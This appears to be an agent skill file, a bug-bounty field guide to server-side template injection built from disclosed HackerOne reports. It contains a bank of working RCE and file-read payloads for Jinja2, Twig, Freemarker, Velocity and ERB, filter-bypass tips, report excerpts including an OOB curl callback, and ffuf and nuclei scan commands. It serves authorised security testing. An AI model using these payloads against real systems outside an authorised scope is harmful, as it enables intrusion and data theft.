---
name: hackerone-ssti
description: >-
  Hunt SSTI. Use when user input reaches template engines in emails, PDFs, previews, and CMS themes. Backed by 28 disclosed HackerOne reports.
---

# Server-Side Template Injection (SSTI) — HackerOne field guide

Built from **28** publicly disclosed HackerOne reports (2016–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **28** · paid: **6**
- Median bounty **$2,150** · p90 **$10,000** · max **$10,000** · total **$18,550**
- Median upvotes **26**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Uber | 2 | $13,000 | 172 |
| GitHub Security Lab | 4 | $2,300 | 54 |
| Mail.ru | 2 | $2,000 | 166 |
| Shopify | 2 | $1,000 | 440 |
| Nextcloud | 1 | $250 | 17 |
| GitHub | 2 | $0 | 141 |
| WordPress | 2 | $0 | 41 |
| Unikrn | 1 | $0 | 122 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Identify the engine from output and error messages.
- Escalate to file read/RCE with engine-specific payloads.
- Check email templates, PDF/report generators, and theme editors.

## Payloads & probes

- Jinja2 -> `{{config}}` `{{cycler.__init__.__globals__.os.popen('id').read()}}`
- Twig -> `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`
- Freemarker -> `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- ERB -> `<%= system('id') %>`

## Payload bank

**37 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Detection polyglots

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
*{7*7}
@(7*7)
{{7*'7'}}
${7*'7'}
{{7*7}}${7*7}<%= 7*7 %>#{7*7}
${{7*7}}
{{= 7*7}}
```

### Jinja2 / Twig / Python

```text
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{% for x in range(3) %}x{% endfor %}
```

### Freemarker / Velocity / Java

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
#set($x=7*7)$x
#set($e="".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
#foreach($i in [1..3])$i#end
```

### ERB / Ruby / Rails

```text
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
<%= Rugged::Repository.new('/').head.target_id %>
```

### Blind / OOB

```text
{{7*'7'}}
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
<%= sleep(5) %>
{{range(1000000000)}}
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` (37)

## Bypass tricks

- Bypass filters with string concatenation, `attr`, `|join`, and hex escapes.
- Use sandbox escapes for the specific engine/version.
- Blind SSTI via time delays or OOB.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`template` `name` `message` `email` `subject` `preview` `report` `theme`

## Tools

`tplmap` · `SSTImap` · `Burp` · `interactsh`

## Escalation chains

- SSTI -> RCE.
- SSTI -> file read -> creds.

## Deeper checklist

- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Identify the engine from evaluated output and error messages.
- Escalate to file read/RCE with engine-specific payloads.
- Check sandbox escapes and filter bypasses.
- Look at email templates, PDF/report generators, and theme editors.
- Prove execution with a harmless callback or command output.

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **H1514 Server Side Template Injection in Return Magic email templates?** — `#423541` · Shopify · $0 · ▲409
  > `{{ this. proto .constructor.name }}` -- `Object`
- **uber.com may RCE by Flask Jinja2 Template Injection** — `#125980` · Uber · $10,000 · ▲137
  > First, if you change your profile name to {{ '7' 7 }}, and you will receive a mail
- **Urgent: Server side template injection via Smarty template allows for RCE** — `#164224` · Unikrn · $0 · ▲122
  > To start, I began with the payload {7 7} and received a template error in the email I received {F115749} Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to test {php} tags by…
- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward** — `#2332623` · GitHub · $0 · ▲80
  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding.
- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection** — `#2332551` · GitHub · $0 · ▲61
  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring SMTP options.
- **Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com** — `#301406` · Ubiquiti Inc. · $0 · ▲47
  > This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak.
- **Client Side Template Injection to Stored XSS in Image Collection** — `#2234564` · Mars · $0 · ▲39
  > Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages.
- **Reflected XSS on developer.uber.com via Angular template injection** — `#125027` · Uber · $3,000 · ▲35
  > `https://developer.uber.com/docs/deep-linking?q=wrtz{{( ="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor( . proto ,$).value,0,"alert(1)")()}}zzzz`
- **XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app** — `#217790` · Shopify · $1,000 · ▲31
  > The method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a…
- **[mercantile.wordpress.org] Reflected XSS via AngularJS Template Injection** — `#230234` · WordPress · $0 · ▲29
  > I came across a potential exploitation vector after noticing that a search query for `{{2 2}}` returned `4` in the site title response.
- **Server Side Template Injection on Name parameter during Sign Up process** — `#1104349` · Glovo · $0 · ▲28
  > In this scenario, when an attacker signs up on the platform and uses a payload in the First Name field, the payload is rendered server side and it gets executed in the promotional/welcome emails sent to the user
- **SSTI leads to Command injection** — `#3584149` · curl · $0 · ▲25
  > unhanticated Rce via command line with sleep break the server until finish the request
- **Unauthenticated SSRF in 3rd party module "cerdic/csstidy"** — `#1595006` · Nextcloud · $250 · ▲17
  > To download remote data as CSS file, either use the interface or try this: http://example.com/apps/mail/vendor/cerdic/css-tidy/css optimiser.php?url=http://localhost/apps/richdocuments/docs/custom.css&custom=1&template=4
- **Client-side Template Injection in Search, user email/token leak and maybe sandbox escape** — `#271960` · Rockstar Games · $0 · ▲15
  > We resolved this issue by updating our version of AngularJS, and by applying the `ng-non-bindable` directive to the vulnerable fields.
- **[marketplace.informatica.com] -  Template Injection** — `#299241` · Informatica · $0 · ▲12
  > The researcher has identified and reported a "Template Injection" vulnerability in one of Informatica's domain and helped us in resolving the issue.
- **Stored xss via template injection** — `#250837` · WordPress · $0 · ▲12
  > 3.change name to {{constructor.constructor('alert(1)')()}} & forward request.
- **Server-side Template Injection in lodash.js** — `#904672` · Node.js third-party modules · $0 · ▲8
  > Step 3: Visit the vulnerable application and enter a payload such as `${JSON.stringify(process.env)}` into the `name` parameter e.g.
- **Self-DoS due to template injection via email field in password reset form on access.acronis.com** — `#1265344` · Acronis · $0 · ▲7
  > Open [https://access.acronis.com/reset password/new] and Enter the mail Payload : sudo bash{{8 8}}@wearehackerone.com
- **XSS via Client Side Template Injection on www.███/News/Speeches** — `#1736317` · U.S. Dept Of Defense · $0 · ▲6
  > `https://www.████/News/Speeches/?Search={{window['eval'](window['atob'](window['decodeURIComponent']('BASE 64 ENCODED PAYLOAD')))}}`
- **Server-side template injection at ujs test server** — `#942103` · Ruby on Rails · $0 · ▲5
  > https://github.com/rails/rails/blob/v6.0.3.2/actionview/test/ujs/server.rb

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 2× | `{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}` |
| 2× | `{{7*7}}` |
| 2× | `{{...}}` |
| 1× | `{{ this }}` |
| 1× | `{{ this.__proto__ }}` |
| 1× | `{{ this.__proto__.constructor.name }}` |
| 1× | `https://<shop>.myshopify.com/admin/apps/returnmagic` |
| 1× | `{{this}}` |
| 1× | `{php}print "Hello"{/php}` |
| 1× | `{F115751}. Finally I used file_get_contents to begin extracting the etc/pass file` |
| 1× | `-alert(document.domain)-` |
| 1× | `with($context) { / with($registry) { / return {typedInput: ''-alert(document.domain)-''} / } / }` |
| 1× | `window.parent.postMessage(JSON.stringify({ / message: "Shopify.API.Modal.input", / data: { / message: { / message: "", / value: "'-alert(doc` |
| 1× | `/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48e` |
| 1× | `/admin/apps/$id` |
| 1× | `shopify-whitehat-1@bored.engineer` |
| 1× | `$your-shop$.myshopify.com` |
| 1× | `https://mercantile.wordpress.org/search/{{constructor.constructor('alert(document.domain)')()}}` |
| 1× | `{{2*2}}` |
| 1× | `curl -os{popen('sleep 10').read()} --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun` |

## Parameters observed

`url` · `name` · `Search` · `client_id` · `scope` · `redirect_uri` · `state` · `custom` · `template` · `signature` · `content_type` · `content`

## Case studies

### H1514 Server Side Template Injection in Return Magic email templates?
`#423541` · Shopify · $0 · n/a · 2019-04-04 · ▲409
> Summary: Possible template injection in return magic email templates. Description: I've been playing with return magic workflow email templates and there seems to be some kinda of template injection but I am not sure if it's exploitable or even valid. Here is why I think it could be vulnerable: I set the email template to the following and then test the template and then the results go to my gmail inbox. {{ this }} - [Object Object] {{ this.

### uber.com may RCE by Flask Jinja2 Template Injection
`#125980` · Uber · $10,000 · n/a · 2016-04-06 · ▲137
> Hi, Uber Security Team I found an RCE in rider.uber.com. First, if you change your profile name to {{ '7' 7 }}, and you will receive a mail "Your Uber account information has been updated" sent by support@uber.com And in mail body, you can see your name become '7777777' This is a vulnerability about Flask Template Engine(Jinja2) Injection , more detail can be seen in these blogs https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/…

### Urgent: Server side template injection via Smarty template allows for RCE
`#164224` · Unikrn · $0 · n/a · 2017-08-17 · ▲122
> It appears as though you are using smarty on the backend for templating. Entering a malicious payload as my firstname, lastname and nickname and then inviting a user to join the site results in the code being executed. To start, I began with the payload {7 7} and received a template error in the email I received {F115749} Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to…

### Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward
`#2332623` · GitHub · $0 · high · 2024-09-13 · ▲80
> A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role.

### Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com
`#301406` · Ubiquiti Inc. · $0 · high · 2018-03-07 · ▲47
> The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect dev-ucrm-billing-demo.ubnt.com, although is limited by the restricted environment (docker) with don't allow any sensitive information leak.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssti.txt` | 21 |
| `~/.local/share/hackerone-reports/wordlists/params_ssti.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` | 37 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssti.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssti.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssti.txt \
     -mr '<hit-marker>' -rate 20
```

## Nuclei

Test name/email/subject/template/preview fields; confirm engine before RCE.

```sh
nuclei -u https://target -tags ssti \
       -severity low,medium,high,critical -rl 40 -o nuclei_ssti.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssti -dast \
       -rl 40 -o nuclei_ssti_ssti.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssti --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssti
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssti
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssti --min-bounty 1000
```

## Related

- `hackerone-rce` (1,399 reports)
- `hackerone-xss` (2,569 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
